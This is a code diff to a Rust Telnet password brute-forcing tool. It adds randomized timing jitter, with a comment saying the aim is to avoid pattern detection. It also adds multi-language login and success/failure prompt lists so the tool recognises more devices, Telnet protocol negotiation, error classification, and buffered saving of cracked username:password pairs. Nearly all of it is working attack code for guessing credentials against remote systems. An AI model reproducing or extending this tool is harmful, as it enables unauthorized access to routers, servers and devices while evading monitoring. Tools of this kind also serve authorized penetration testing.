 
@@ -1094,19 +1665,44 @@ fn spawn_worker(
                 Ok(false) => {
                     stats.record_attempt(false, false);
                     if config.verbose {
-                        println!("{} Failed: {}:{}", "[-]".red(), user, pass);
+                        println!(
+                            "{} Failed: {}:{}",
+                            "[-]".red(),
+                            sanitize_input(user.as_ref()),
+                            sanitize_input(pass.as_ref())
+                        );
                     }
                 }
                 Err(e) => {
                     stats.record_attempt(false, true);
+                    let msg = e.to_string();
+                    let kind = classify_telnet_error(&msg);
+                    match kind {
+                        "Read/Connection timeout" => stats.record_timeout(),
+                        "Broken pipe" => stats.record_broken_pipe(),
+                        _ => {}
+                    }
+                    stats.record_error_kind(kind).await;
                     if config.verbose {
-                        eprintln!("{} Error ({}): {}:{}", "[!]".yellow(), e, user, pass);
+                        eprintln!(
+                            "{} Error ({}): {}:{}",
+                            "[!]".yellow(),
+                            msg,
+                            sanitize_input(user.as_ref()),
+                            sanitize_input(pass.as_ref())
+                        );
                     }
                 }
             }
 
             if config.delay_ms > 0 {
-                sleep(Duration::from_millis(config.delay_ms)).await;
+                // Add jitter to avoid pattern detection: randomize between 75% and 125% of base delay
+                let base_delay = config.delay_ms;
+                let jitter_range = base_delay / 4; // 25% variation
+                let min_delay = base_delay.saturating_sub(jitter_range);
+                let max_delay = base_delay.saturating_add(jitter_range);
+                let randomized_delay = rand::rng().random_range(min_delay..=max_delay);
+                sleep(Duration::from_millis(randomized_delay)).await;
             }
         }
     })
@@ -1157,7 +1753,13 @@ fn spawn_streaming_producers(
                              stop_flag: Arc<AtomicBool>,
 ) {
     if password_count > 0 {
-        let password_path = config.password_wordlist.clone().unwrap();
+        let password_path = match config.password_wordlist.clone() {
+            Some(path) => path,
+            None => {
+                eprintln!("[!] Password wordlist required but not configured");
+                return;
+            }
+        };
         let username_path = config.username_wordlist.clone();
         let full_combo = config.full_combo;
         let tx_clone = tx.clone();
@@ -1346,6 +1948,20 @@ async fn enqueue_wordlist_combos_streaming(
                                            _password_count: usize,
 ) -> Result<()> {
     if full_combo {
+        // Open password file once and cache passwords to avoid reopening file for each username
+        let pass_file = File::open(password_path).await?;
+        let pass_reader = BufReader::new(pass_file);
+        let mut pass_lines = pass_reader.lines();
+        let mut passwords = Vec::new();
+
+        while let Some(pass_line) = pass_lines.next_line().await? {
+            let pass = pass_line.trim();
+            if !pass.is_empty() {
+                passwords.push(Arc::<str>::from(pass));
+            }
+        }
+
+        // Now iterate through usernames and send combinations
         let user_file = File::open(username_path).await?;
         let user_reader = BufReader::new(user_file);
         let mut user_lines = user_reader.lines();
@@ -1357,17 +1973,12 @@ async fn enqueue_wordlist_combos_streaming(
             }
             let user_arc: Arc<str> = Arc::from(user);
 
-            let pass_file = File::open(password_path).await?;
-            let pass_reader = BufReader::new(pass_file);
-            let mut pass_lines = pass_reader.lines();
-
-            while let Some(pass_line) = pass_lines.next_line().await? {
-                let pass = pass_line.trim();
-                if pass.is_empty() || stop_flag.load(Ordering::Relaxed) {
-                    continue;
+            // Send combinations for this user with all passwords
+            for pass_arc in &passwords {
+                if stop_flag.load(Ordering::Relaxed) {
+                    return Ok(());
                 }
-                let pass_arc: Arc<str> = Arc::from(pass);
-                tx.send((user_arc.clone(), pass_arc)).await.ok();
+                tx.send((user_arc.clone(), pass_arc.clone())).await.ok();
             }
         }
     } else if username_count == 1 {
@@ -1526,7 +2137,12 @@ async fn build_interactive_config(target: &str) -> Result<TelnetBruteforceConfig
     let threads = prompt_threads(8);
     let delay_ms = prompt_delay(100);
     let connection_timeout = prompt_timeout("Connection timeout (seconds, default 3): ", 3);
-    let read_timeout = prompt_timeout("Read timeout (seconds, default 1): ", 1);
+    let banner_read_timeout = prompt_timeout("Banner read timeout (seconds, default 2): ", 2);
+    let login_prompt_timeout = prompt_timeout("Login prompt timeout (seconds, default 3): ", 3);
+    let password_prompt_timeout = prompt_timeout("Password prompt timeout (seconds, default 3): ", 3);
+    let auth_response_timeout = prompt_timeout("Auth response timeout (seconds, default 5): ", 5);
+    let command_timeout = prompt_timeout("Command timeout (seconds, default 3): ", 3);
+    let write_timeout = 500; // Fixed write timeout in milliseconds
 
     let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
     let raw_bruteforce = prompt_yes_no("Enable raw brute-force password generation? (y/n): ", false);
@@ -1578,7 +2194,9 @@ async fn build_interactive_config(target: &str) -> Result<TelnetBruteforceConfig
     Ok(TelnetBruteforceConfig {
         target: target.to_string(),
        port, username_wordlist, password_wordlist, threads, delay_ms,
-       connection_timeout, read_timeout, stop_on_success, verbose, full_combo,
+       connection_timeout, banner_read_timeout, login_prompt_timeout,
+       password_prompt_timeout, auth_response_timeout, command_timeout, write_timeout,
+       stop_on_success, verbose, full_combo,
        raw_bruteforce, raw_charset, raw_min_length, raw_max_length,
        output_file, append_mode, pre_validate, retry_on_error, max_retries,
        login_prompts, password_prompts, success_indicators, failure_indicators,
@@ -1591,9 +2209,59 @@ async fn build_interactive_config(target: &str) -> Result<TelnetBruteforceConfig
 
 fn get_default_prompts() -> (Vec<String>, Vec<String>, Vec<String>, Vec<String>) {
     (
-        vec!["login:".to_string(), "username:".to_string(), "user:".to_string()],
-     vec!["password:".to_string()],
+        // Login prompts - English + Multi-language support
      vec![
+            // English
+            "login:".to_string(), "username:".to_string(), "user:".to_string(),
+            "user name:".to_string(), "account:".to_string(), "userid:".to_string(),
+            // Spanish
+            "usuario:".to_string(), "nombre de usuario:".to_string(), "login:".to_string(),
+            // French
+            "identifiant:".to_string(), "nom d'utilisateur:".to_string(), "connexion:".to_string(),
+            // Portuguese
+            "usuário:".to_string(), "login:".to_string(), "usuário:".to_string(),
+            // German
+            "benutzername:".to_string(), "anmeldename:".to_string(), "login:".to_string(),
+            // Italian
+            "nome utente:".to_string(), "login:".to_string(), "utente:".to_string(),
+            // Russian (already had some)
+            "логин:".to_string(), "пользователь:".to_string(),
+            // Chinese (simplified)
+            "用户名:".to_string(), "登录:".to_string(), "用户:".to_string(),
+            // Japanese
+            "ユーザー名:".to_string(), "ログイン:".to_string(),
+            // Arabic
+            "اسم المستخدم:".to_string(), "تسجيل الدخول:".to_string(),
+        ],
+
+        // Password prompts - English + Multi-language support
+        vec![
+            // English
+            "password:".to_string(), "passwd:".to_string(), "pass:".to_string(),
+            "enter password".to_string(), "password for".to_string(),
+            // Spanish
+            "contraseña:".to_string(), "clave:".to_string(),
+            // French
+            "mot de passe:".to_string(),
+            // Portuguese
+            "senha:".to_string(),
+            // German
+            "passwort:".to_string(),
+            // Italian
+            "password:".to_string(),
+            // Russian
+            "пароль:".to_string(),
+            // Chinese
+            "密码:".to_string(),
+            // Japanese
+            "パスワード:".to_string(),
+            // Arabic
+            "كلمة المرور:".to_string(),
+        ],
+
+        // Success indicators - English + Multi-language support
+        vec![
+            // English
          "$", "#", "> ", "~ ", "% ", "~$", "~#", "last login", "welcome",
      "welcome to", "logged in", "login successful", "authentication successful",
      "successfully authenticated", "motd", "message of the day",
@@ -1601,18 +2269,463 @@ fn get_default_prompts() -> (Vec<String>, Vec<String>, Vec<String>, Vec<String>)
      "root@", "admin@", "ubuntu", "debian", "centos", "red hat", "fedora",
      "freebsd", "openbsd", "router>", "router#", "switch>", "switch#",
      "cisco", "ios>", "ios#", "[root@", "[admin@", "bash-", "sh-",
-     "press any key", "continue", "enter command", "available commands", "type help"
+            "press any key", "continue", "enter command", "available commands", "type help",
+            // Spanish
+            "bienvenido", "conectado", "autenticación exitosa", "login exitoso",
+            // French
+            "bienvenue", "connecté", "authentification réussie",
+            // Portuguese
+            "bem-vindo", "conectado", "autenticação bem-sucedida",
+            // German
+            "willkommen", "angemeldet", "authentifizierung erfolgreich",
+            // Italian
+            "benvenuto", "connesso", "autenticazione riuscita",
+            // Russian
+            "добро пожаловать", "подключен", "аутентификация успешна",
+            // Chinese
+            "欢迎", "已连接", "认证成功",
+            // Japanese
+            "ようこそ", "接続されました", "認証成功",
      ].iter().map(|s| s.to_string()).collect(),
+
+        // Failure indicators - English + Multi-language support
      vec![
+            // English
          "incorrect", "failed", "denied", "invalid", "authentication failed",
      "% authentication", "% bad", "access denied", "login incorrect",
      "permission denied", "not authorized", "authentication error",
      "bad password", "wrong password", "authentication failure",
      "login failed", "invalid login", "invalid password", "invalid username",
      "bad username", "user unknown", "unknown user", "connection refused",
-     "connection closed", "connection reset", "too many", "maximum"
+            "connection closed", "connection reset", "too many", "maximum",
+            // Spanish
+            "incorrecto", "fallido", "denegado", "inválido", "autenticación fallida",
+            "acceso denegado", "permiso denegado", "no autorizado",
+            // French
+            "incorrect", "échoué", "refusé", "invalide", "authentification échouée",
+            "accès refusé", "permission refusée", "non autorisé",
+            // Portuguese
+            "incorreto", "falhou", "negado", "inválido", "autenticação falhou",
+            "acesso negado", "permissão negada", "não autorizado",
+            // German
+            "falsch", "fehlgeschlagen", "verweigert", "ungültig", "authentifizierung fehlgeschlagen",
+            "zugriff verweigert", "berechtigung verweigert", "nicht autorisiert",
+            // Italian
+            "errato", "fallito", "negato", "non valido", "autenticazione fallita",
+            "accesso negato", "permesso negato", "non autorizzato",
+            // Russian
+            "неправильный", "не удалось", "отказано", "недействительный", "аутентификация не удалась",
+            "доступ запрещен", "разрешение отклонено", "не авторизован",
+            // Chinese
+            "错误", "失败", "拒绝", "无效", "认证失败",
+            "访问被拒绝", "权限被拒绝", "未授权",
+            // Japanese
+            "間違っている", "失敗", "拒否", "無効", "認証失敗",
+            "アクセス拒否", "許可拒否", "未承認",
      ].iter().map(|s| s.to_string()).collect(),
     )
+}
+
+/// Strip ANSI escape sequences from terminal output for cleaner parsing
+/// Handles CSI sequences like \x1b[31m (colors), \x1b[2J (clear screen), etc.
+#[derive(Debug)]
+enum EofType {
+    CleanClose,      // Server properly closed connection (e.g., logout)
+    AbruptDisconnect, // Connection reset or network error
+    PartialData,     // Got some data then EOF
+}
+
+fn classify_eof(response: &str, login_sent: bool, pass_sent: bool, cycle: i32) -> EofType {
+    if response.is_empty() {
+        // No data received before EOF
+        if cycle == 0 {
+            // EOF immediately after connect - not a telnet server
+            EofType::CleanClose
+        } else {
+            // EOF after some cycles - abrupt disconnect
+            EofType::AbruptDisconnect
+        }
+    } else {
+        // Some data received before EOF
+        let response_lower = response.to_lowercase();
+
+        // Check for clean logout indicators
+        let clean_close_indicators = [
+            "logout", "goodbye", "bye", "closed", "disconnected",
+            "connection closed", "session ended", "logged out"
+        ];
+
+        for indicator in &clean_close_indicators {
+            if response_lower.contains(indicator) {
+                return EofType::CleanClose;
+            }
+        }
+
+        // Check if we got a meaningful response that suggests the connection worked
+        if (login_sent || pass_sent) && response.len() > 10 {
+            EofType::PartialData
+        } else {
+            EofType::AbruptDisconnect
+        }
+    }
+}
+
+fn has_success_indicators(response: &str) -> bool {
+    if response.len() < 5 {
+        return false;
+    }
+
+    let response_lower = response.to_lowercase();
+
+    // Check for success indicators at the end of response
+    let success_indicators = [
+        "$ ", "# ", "> ", "~ ", "% ", "last login", "welcome",
+        "login successful", "authentication successful", "logged in",
+        "access granted", "successfully", "ok", "accepted"
+    ];
+
+    for indicator in &success_indicators {
+        if response_lower.contains(indicator) {
+            return true;
+        }
+    }
+
+    false
+}
+
+fn is_connection_error(error: &std::io::Error) -> bool {
+    use std::io::ErrorKind::*;
+    matches!(error.kind(),
+        ConnectionReset | ConnectionAborted | ConnectionRefused |
+        NetworkUnreachable | HostUnreachable | NetworkDown |
+        BrokenPipe | NotConnected | TimedOut
+    )
+}
+
+/// Telnet IAC (Interpret As Command) constants
+const IAC: u8 = 255;  // 0xFF
+const DONT: u8 = 254; // 0xFE
+const DO: u8 = 253;   // 0xFD
+const WONT: u8 = 252; // 0xFC
+const WILL: u8 = 251; // 0xFB
+const SB: u8 = 250;   // 0xFA - Subnegotiation Begin
+const SE: u8 = 240;   // 0xF0 - Subnegotiation End
+const GA: u8 = 249;   // 0xF9 - Go Ahead
+const EL: u8 = 248;   // 0xF8 - Erase Line
+const EC: u8 = 247;   // 0xF7 - Erase Character
+const AYT: u8 = 246;  // 0xF6 - Are You There
+const AO: u8 = 245;  // 0xF5 - Abort Output
+const IP: u8 = 244;  // 0xF4 - Interrupt Process
+const BREAK: u8 = 243; // 0xF3
+const DM: u8 = 242;   // 0xF2 - Data Mark
+const NOP: u8 = 241;  // 0xF1 - No Operation
+
+/// Telnet option codes
+const ECHO: u8 = 1;
+const SUPPRESS_GO_AHEAD: u8 = 3;
+const TERMINAL_TYPE: u8 = 24;
+const WINDOW_SIZE: u8 = 31;
+const TERMINAL_SPEED: u8 = 32;
+const REMOTE_FLOW_CONTROL: u8 = 33;
+const LINEMODE: u8 = 34;
+const ENVIRONMENT_VARIABLES: u8 = 36;
+
+/// Generate IAC response for option negotiation
+/// Returns bytes to send in response to server option requests
+fn generate_iac_response(cmd: u8, option: u8) -> Vec<u8> {
+    match cmd {
+        DO => {
+            // Server wants us to enable an option
+            // Accept basic options that are safe and commonly used
+            match option {
+                ECHO | SUPPRESS_GO_AHEAD => {
+                    // Accept these as they're standard and safe
+                    vec![IAC, WILL, option]
+                }
+                TERMINAL_TYPE | WINDOW_SIZE | TERMINAL_SPEED | REMOTE_FLOW_CONTROL | LINEMODE | ENVIRONMENT_VARIABLES => {
+                    // Refuse advanced options we don't implement
+                    vec![IAC, WONT, option]
+                }
+                _ => {
+                    // Unknown option - refuse it
+                    vec![IAC, WONT, option]
+                }
+            }
+        }
+        DONT => {
+            // Server wants us to disable an option - always comply
+            vec![IAC, WONT, option]
+        }
+        WILL => {
+            // Server wants to enable an option
+            // Accept basic options; refuse advanced ones
+            match option {
+                ECHO | SUPPRESS_GO_AHEAD => {
+                    vec![IAC, DO, option]
+                }
+                TERMINAL_TYPE | WINDOW_SIZE | TERMINAL_SPEED | REMOTE_FLOW_CONTROL | LINEMODE | ENVIRONMENT_VARIABLES => {
+                    vec![IAC, DONT, option]
+                }
+                _ => {
+                    vec![IAC, DONT, option]
+                }
+            }
+        }
+        WONT => {
+            // Server refuses an option - acknowledge
+            vec![IAC, DONT, option]
+        }
+        _ => vec![] // Unknown command, no response
+    }
+}
+
+/// Process Telnet IAC commands and return clean application data
+/// Handles option negotiation (WILL/WONT/DO/DONT) and strips IAC sequences
+/// Returns (clean_data, iac_responses) where iac_responses are bytes to send back
+fn process_telnet_iac(data: &[u8]) -> (Vec<u8>, Vec<u8>) {
+    let mut result = Vec::with_capacity(data.len());
+    let mut iac_responses = Vec::new();
+    let mut i = 0;
+    
+    while i < data.len() {
+        if data[i] == IAC {
+            if i + 1 >= data.len() {
+                // Incomplete IAC sequence, skip
+                break;
+            }
+            
+            let cmd = data[i + 1];
+            
+            match cmd {
+                IAC => {
+                    // Double IAC means literal 0xFF byte
+                    result.push(IAC);
+                    i += 2;
+                }
+                WILL | WONT | DO | DONT => {
+                    // Option negotiation: IAC [WILL|WONT|DO|DONT] <option>
+                    if i + 2 < data.len() {
+                        let option = data[i + 2];
+                        // Generate appropriate response
+                        let response = generate_iac_response(cmd, option);
+                        iac_responses.extend_from_slice(&response);
+                        i += 3;
+                    } else {
+                        // Incomplete negotiation, skip
+                        break;
+                    }
+                }
+                SB => {
+                    // Subnegotiation: IAC SB <option> <data> IAC SE
+                    // Skip until we find IAC SE
+                    i += 2; // Skip IAC SB
+                    while i < data.len() {
+                        if data[i] == IAC && i + 1 < data.len() && data[i + 1] == SE {
+                            i += 2; // Skip IAC SE
+                            break;
+                        }
+                        i += 1;
+                    }
+                }
+                GA | EL | EC | AYT | AO | IP | BREAK | DM | NOP => {
+                    // Single-byte commands, just skip them
+                    i += 2;
+                }
+                _ => {
+                    // Unknown command, skip IAC and the byte after it
+                    i += 2;
+                }
+            }
+        } else {
+            // Regular data byte
+            result.push(data[i]);
+            i += 1;
+        }
+    }
+    
+    (result, iac_responses)
+}
+
+/// Strip ANSI escape sequences from terminal output for cleaner parsing
+/// Handles CSI sequences (\x1b[...), OSC sequences (\x1b]...), and other escape types
+fn strip_ansi_escape_sequences(input: &str) -> String {
+    let mut result = String::with_capacity(input.len());
+    let mut chars = input.chars().peekable();
+    let mut in_escape = false;
+    let mut escape_type = EscapeType::None;
+
+    while let Some(ch) = chars.next() {
+        if ch == '\x1b' {
+            // Start of escape sequence
+            if let Some(next_ch) = chars.peek() {
+                match next_ch {
+                    '[' => {
+                        // CSI sequence: ESC [
+                        chars.next(); // consume '['
+                        in_escape = true;
+                        escape_type = EscapeType::CSI;
+                        continue;
+                    }
+                    ']' => {
+                        // OSC sequence: ESC ]
+                        chars.next(); // consume ']'
+                        in_escape = true;
+                        escape_type = EscapeType::OSC;
+                        continue;
+                    }
+                    '(' | ')' => {
+                        // Character set sequences: ESC ( or ESC )
+                        chars.next(); // consume '(' or ')'
+                        in_escape = true;
+                        escape_type = EscapeType::Charset;
+                        continue;
+                    }
+                    _ => {
+                        // Other escape sequences
+                        in_escape = true;
+                        escape_type = EscapeType::Other;
+                        continue;
+                    }
+                }
+            }
+        }
+
+        if in_escape {
+            // Inside escape sequence - look for sequence terminator based on type
+            let should_end = match escape_type {
+                EscapeType::CSI => {
+                    // CSI ends with a letter, @, `, or {
+                    ch.is_ascii_alphabetic() || ch == '@' || ch == '`' || ch == '{'
+                }
+                EscapeType::OSC => {
+                    // OSC ends with ESC \ (ST - String Terminator) or BEL (0x07)
+                    ch == '\x07' || (ch == '\\' && chars.peek() == Some(&'\x1b'))
+                }
+                EscapeType::Charset => {
+                    // Character set sequences are typically single character
+                    true
+                }
+                EscapeType::Other => {
+                    // For other escapes, look for common terminators
+                    ch.is_ascii_alphabetic() || ch.is_ascii_digit() || ch == '\x07'
+                }
+                EscapeType::None => false,
+            };
+
+            if should_end {
+                let was_osc = escape_type == EscapeType::OSC;
+                in_escape = false;
+                escape_type = EscapeType::None;
+                // For OSC sequences ending with ESC \, consume the \
+                if was_osc && ch == '\\' {
+                    continue;
+                }
+            }
+            // Skip all characters in escape sequence
+            continue;
+        }
+
+        result.push(ch);
+    }
+
+    result
+}
+
+#[derive(Clone, Copy, PartialEq)]
+enum EscapeType {
+    None,
+    CSI,    // Control Sequence Introducer: ESC [
+    OSC,    // Operating System Command: ESC ]
+    Charset,// Character set: ESC ( or ESC )
+    Other,  // Other escape sequences
+}
+
+/// Sanitize user input to prevent format string attacks and display issues
+/// Removes or escapes potentially dangerous characters
+fn sanitize_input(input: &str) -> String {
+    input.chars()
+        .map(|c| {
+            if c.is_control() || c == '%' {
+                '?'
+            } else if c == '\r' || c == '\n' || c == '\t' {
+                ' '
+            } else {
+                c
+            }
+        })
+        .collect()
+}
+
+/// Enhanced error classification with specific error types for better debugging
+fn classify_telnet_error(msg: &str) -> &'static str {
+    let lower = msg.to_lowercase();
+    
+    // Connection-related errors
+    if lower.contains("connection refused") || lower.contains("connection reset") {
+        "Connection refused/reset"
+    } else if lower.contains("connection aborted") {
+        "Connection aborted"
+    } else if lower.contains("connection closed") || lower.contains("connection abruptly closed") {
+        "Connection closed"
+    } else if lower.contains("connection timeout") || lower.contains("connect timeout") {
+        "Connection timeout"
+    } else if lower.contains("read timeout") || lower.contains("timeout") {
+        "Read timeout"
+    } else if lower.contains("write timeout") {
+        "Write timeout"
+    } else if lower.contains("broken pipe") {
+        "Broken pipe"
+    } else if lower.contains("network unreachable") {
+        "Network unreachable"
+    } else if lower.contains("host unreachable") {
+        "Host unreachable"
+    } else if lower.contains("network down") {
+        "Network down"
+    } else if lower.contains("no route to host") {
+        "No route to host"
+    }
+    // DNS and resolution errors
+    else if lower.contains("cannot resolve") || lower.contains("dns") || lower.contains("name resolution") {
+        "DNS resolution failed"
+    } else if lower.contains("name or service not known") {
+        "Hostname not found"
+    }
+    // Authentication and protocol errors
+    else if lower.contains("authentication failed") || lower.contains("auth failed") {
+        "Authentication failed"
+    } else if lower.contains("authentication error") || lower.contains("auth error") {
+        "Authentication error"
+    } else if lower.contains("login failed") || lower.contains("login incorrect") {
+        "Login failed"
+    } else if lower.contains("access denied") || lower.contains("permission denied") {
+        "Access denied"
+    } else if lower.contains("invalid") && (lower.contains("user") || lower.contains("password") || lower.contains("credential")) {
+        "Invalid credentials"
+    } else if lower.contains("no banner") || lower.contains("banner read") {
+        "No banner received"
+    } else if lower.contains("handshake") || lower.contains("protocol") {
+        "Protocol/handshake error"
+    }
+    // I/O and system errors
+    else if lower.contains("too many open files") || lower.contains("resource temporarily unavailable") {
+        "Resource exhaustion"
+    } else if lower.contains("interrupted") || lower.contains("would block") {
+        "I/O interrupted"
+    } else if lower.contains("invalid argument") {
+        "Invalid argument"
+    } else if lower.contains("not connected") {
+        "Not connected"
+    }
+    // Telnet-specific errors
+    else if lower.contains("iac") || lower.contains("telnet option") {
+        "Telnet option negotiation error"
+    } else if lower.contains("malformed") || lower.contains("corrupt") {
+        "Malformed data"
+    }
+    // Generic fallback
+    else {
+        "Other error"
+    }
 }
 
 async fn load_and_validate_config(path: &str, target: &str) -> Result<TelnetBruteforceConfig> {
@@ -1791,7 +2904,7 @@ async fn validate_telnet_target(addr: &str, config: &TelnetBruteforceConfig) -> 
     ).await??;
 
     let mut buf = vec![0u8; 1024];
-    match timeout(Duration::from_secs(config.read_timeout), stream.read(&mut buf)).await {
+    match timeout(Duration::from_secs(config.banner_read_timeout), stream.read(&mut buf)).await {
         Ok(Ok(n)) if n > 0 => {
             let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();
             if response.contains("login") || response.contains("username") ||
@@ -1805,17 +2918,78 @@ async fn validate_telnet_target(addr: &str, config: &TelnetBruteforceConfig) -> 
     }
 }
 
-async fn append_result(output_file: &str, username: &str, password: &str) -> Result<()> {
-    let mut file = OpenOptions::new()
-    .create(true)
-    .append(true)
-    .open(output_file)
-    .await?;
-
-    file.write_all(format!("{}:{}\n", username, password).as_bytes()).await?;
-    file.flush().await?;
-    Ok(())
+/// Buffered writer for efficient result output
+/// Maintains an open file handle and buffers writes to reduce I/O operations
+struct BufferedResultWriter {
+    file: tokio::fs::File,
+    buffer: Vec<String>,
+    buffer_size_limit: usize,
+    flush_interval: std::time::Duration,
+    last_flush: std::time::Instant,
 }
+
+impl BufferedResultWriter {
+    async fn new(output_file: &str) -> Result<Self> {
+        let file = OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(output_file)
+            .await?;
+
+        Ok(Self {
+            file,
+            buffer: Vec::with_capacity(100), // Pre-allocate space for 100 lines
+            buffer_size_limit: 50, // Flush every 50 lines
+            flush_interval: std::time::Duration::from_secs(5), // Or every 5 seconds
+            last_flush: std::time::Instant::now(),
+        })
+    }
+
+    async fn write_result(&mut self, username: &str, password: &str) -> Result<()> {
+        self.buffer.push(format!("{}:{}", username, password));
+
+        // Flush if buffer is full or enough time has passed
+        if self.buffer.len() >= self.buffer_size_limit ||
+           self.last_flush.elapsed() >= self.flush_interval {
+            self.flush().await?;
+        }
+
+        Ok(())
+    }
+
+    async fn flush(&mut self) -> Result<()> {
+        if self.buffer.is_empty() {
+            return Ok(());
+        }
+
+        let mut content = self.buffer.join("\n");
+        content.push('\n');
+
+        self.file.write_all(content.as_bytes()).await?;
+        self.file.flush().await?;
+
+        self.buffer.clear();
+        self.last_flush = std::time::Instant::now();
+
+        Ok(())
+    }
+
+    async fn finalize(&mut self) -> Result<()> {
+        self.flush().await?;
+        self.file.sync_all().await?; // Ensure data is written to disk
+        Ok(())
+    }
+}
+
+impl Drop for BufferedResultWriter {
+    fn drop(&mut self) {
+        // Note: We can't do async operations in Drop, but we can flush synchronously
+        // The finalize() method should be called explicitly to ensure data integrity
+        // This Drop implementation is mainly for safety in case finalize() wasn't called
+        let _ = self.file.sync_all(); // Best effort sync
+    }
+}
+
 
 async fn print_final_report(
     found_creds: &Arc<Mutex<HashSet<(String, String)>>>,
@@ -1833,6 +3007,7 @@ async fn print_final_report(
             println!("  {}  {}:{}", "✓".green(), u, p);
         }
         println!("\n[*] Results saved to: {}", output_file);
+        println!("{}", "[!] WARNING: Credentials are stored in plain text. Secure the file appropriately!".yellow().bold());
     }
 }
 
@@ -1953,7 +3128,9 @@ fn normalize_target(host: &str, default_port: u16) -> Result<String> {
     .captures(host.trim())
     .ok_or_else(|| anyhow!("Invalid target format"))?;
 
-    let addr = caps.name("addr").unwrap().as_str();
+    let addr = caps.name("addr")
+        .ok_or_else(|| anyhow!("Missing address in target format"))?
+        .as_str();
     let port = if let Some(m) = caps.name("port") {
         m.as_str().parse::<u16>()?
     } else {
